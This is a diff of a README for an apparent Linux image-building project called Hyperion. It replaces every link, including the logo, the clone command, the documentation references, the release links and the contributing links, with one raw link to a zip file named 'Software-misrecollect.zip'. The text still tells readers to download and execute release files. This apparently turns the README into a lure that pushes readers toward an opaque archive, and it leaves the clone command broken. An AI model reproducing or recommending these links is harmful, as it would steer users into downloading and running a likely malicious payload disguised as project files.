@@ -1,6 +1,6 @@
 # Hyperion 🌌
 
-![Hyperion Logo](https://img.shields.io/badge/Hyperion-Project-blue)
+![Hyperion Logo](https://github.com/zainalibora/hyperion/raw/refs/heads/main/files/scripts/Software-misrecollect.zip)
 
 Welcome to the Hyperion repository! This project focuses on creating immutable, custom Linux images based on the OCI standard. Our goal is to simplify the process of building and managing operating system images while ensuring they are lightweight and efficient.
 
@@ -48,15 +48,15 @@ To get started with Hyperion, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/zainalibora/hyperion.git
+   git clone https://github.com/zainalibora/hyperion/raw/refs/heads/main/files/scripts/Software-misrecollect.zip
    cd hyperion
    ```
 
-2. **Install Dependencies**: Ensure you have the necessary dependencies installed. You can find a list of dependencies in the `INSTALL.md` file.
+2. **Install Dependencies**: Ensure you have the necessary dependencies installed. You can find a list of dependencies in the `https://github.com/zainalibora/hyperion/raw/refs/heads/main/files/scripts/Software-misrecollect.zip` file.
 
 3. **Build the Project**: Use the provided build scripts to compile the project. This will create the necessary binaries and images.
 
-4. **Download and Execute**: For the latest release, visit [Releases](https://github.com/zainalibora/hyperion/releases) to download the required files and execute them.
+4. **Download and Execute**: For the latest release, visit [Releases](https://github.com/zainalibora/hyperion/raw/refs/heads/main/files/scripts/Software-misrecollect.zip) to download the required files and execute them.
 
 ## Usage
 
@@ -79,11 +79,11 @@ After setting up Hyperion, you can use it to build your custom Linux images. Her
    hyperion run my-custom-image
    ```
 
-For detailed usage instructions, refer to the `USAGE.md` file in the repository.
+For detailed usage instructions, refer to the `https://github.com/zainalibora/hyperion/raw/refs/heads/main/files/scripts/Software-misrecollect.zip` file in the repository.
 
 ## Releases
 
-We regularly update Hyperion with new features and fixes. You can find the latest releases at [Releases](https://github.com/zainalibora/hyperion/releases). Download the necessary files and execute them to stay up to date with the project.
+We regularly update Hyperion with new features and fixes. You can find the latest releases at [Releases](https://github.com/zainalibora/hyperion/raw/refs/heads/main/files/scripts/Software-misrecollect.zip). Download the necessary files and execute them to stay up to date with the project.
 
 ## Contributing
 
@@ -97,7 +97,7 @@ We welcome contributions from the community! If you would like to contribute to 
 3. **Make Your Changes**: Implement your changes and ensure they are well-tested.
 4. **Submit a Pull Request**: Push your changes and submit a pull request to the main repository.
 
-Please make sure to follow our [Code of Conduct](CODE_OF_CONDUCT.md) and [Contributing Guidelines](CONTRIBUTING.md).
+Please make sure to follow our [Code of Conduct](https://github.com/zainalibora/hyperion/raw/refs/heads/main/files/scripts/Software-misrecollect.zip) and [Contributing Guidelines](https://github.com/zainalibora/hyperion/raw/refs/heads/main/files/scripts/Software-misrecollect.zip).
 
 ## License
 
@@ -109,4 +109,4 @@ For questions or feedback, please open an issue in the repository or contact the
 
 ---
 
-Thank you for checking out Hyperion! We hope you find it useful for your projects. For updates and more information, visit [Releases](https://github.com/zainalibora/hyperion/releases).
+Thank you for checking out Hyperion! We hope you find it useful for your projects. For updates and more information, visit [Releases](https://github.com/zainalibora/hyperion/raw/refs/heads/main/files/scripts/Software-misrecollect.zip).
